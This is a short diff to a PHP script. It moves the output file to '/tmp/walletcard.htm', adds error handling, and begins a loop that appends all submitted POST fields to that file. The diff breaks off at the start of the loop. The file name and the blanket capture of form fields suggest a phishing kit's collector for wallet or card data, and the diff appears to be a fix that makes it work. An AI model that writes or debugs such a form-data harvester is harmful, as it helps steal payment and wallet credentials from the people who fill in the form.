@@ -1,6 +1,13 @@
 <?php
+// Define a writable file path
+$filePath = '/tmp/walletcard.htm'; // Change this to a directory that is writable
+
 // Open or create a file for writing form data
-$handle = fopen("walletcard.htm", "a");
+$handle = fopen($filePath, "a");
+
+if (!$handle) {
+    die('Failed to open file for writing: ' . error_get_last()['message']);
+}
 
 // Iterate through POST data
 foreach ($_POST as $variable => $value) {
